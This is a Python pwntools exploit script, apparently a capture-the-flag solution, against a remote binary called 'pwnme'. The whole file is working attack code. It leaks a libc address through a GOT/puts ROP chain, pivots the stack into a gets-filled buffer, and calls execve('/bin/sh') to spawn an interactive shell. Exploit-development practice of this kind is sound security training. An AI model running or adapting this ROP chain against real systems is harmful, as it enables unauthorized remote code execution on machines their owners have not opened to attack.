from pwn import *

def generate():
	p.sendlineafter(">> ", "1")
	l = p.recvuntil("Menu").split("\n")[0]
	return l

def exp():
	global p
	
	e = ELF("./pwnme")
	libc = ELF("./libc-2.27.so")
	context.log_level = 'debug'
	p = remote("bincat.kr", 36975)
	

	for i in range(100):
		l = generate()
	
	g1 = 0x400b44
	pop_rbp = 0x4009d8
	pop_rdi = 0x400ec3
	
	rbp = e.got['atoi'] + 0x30
	#gdb.attach(p, gdbscript="b *0x400b44")
	p.sendafter(">>" ,p64(rbp) + p64(g1)+p64(0x400b3c)+ p64(0x1122334455))
	p.send(p64(pop_rbp).ljust(0x20,"\xcc"))
	context.log_level = 'debug'
	p.send(p64(pop_rdi)+p64(e.got['open']) + p64(e.plt['puts']) + p64(0x400b3c)) # next ROP
	data = p.recvuntil("\x7f").strip(" ")

	assert len(data) == 6
	LIBC = u64(data.ljust(8,"\x00")) - libc.symbols['open']

	log.info("LIBC: 0x%x"%LIBC)
	binsh_str = LIBC + libc.search("/bin/sh\x00").next()
	gets = LIBC + libc.symbols['gets']
	execve  = LIBC + libc.symbols['execve']
	pop_rsi = LIBC + 0x23e6a
	pop_rdx = LIBC + 0x1b96

	#gdb.attach(p,gdbscript="b *0x%x"%pop_rdi)
	final = p64(pop_rdi) + p64(binsh_str) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(execve)
	pop_rsp = LIBC + 0x3960
	p.send(p64(pop_rdi) + p64(0x6020c0) + p64(gets) + p64(0x400b3c))
	p.sendline(final) # gets pivot chain
	p.send(p64(pop_rsp) + p64(0x6020c0) + p64(gets) + p64(0x400b3c))
	p.interactive()

	

exp()
#gdb.attach(p,gdbscript="b *0x0400E6C\nb *0x0400F28")
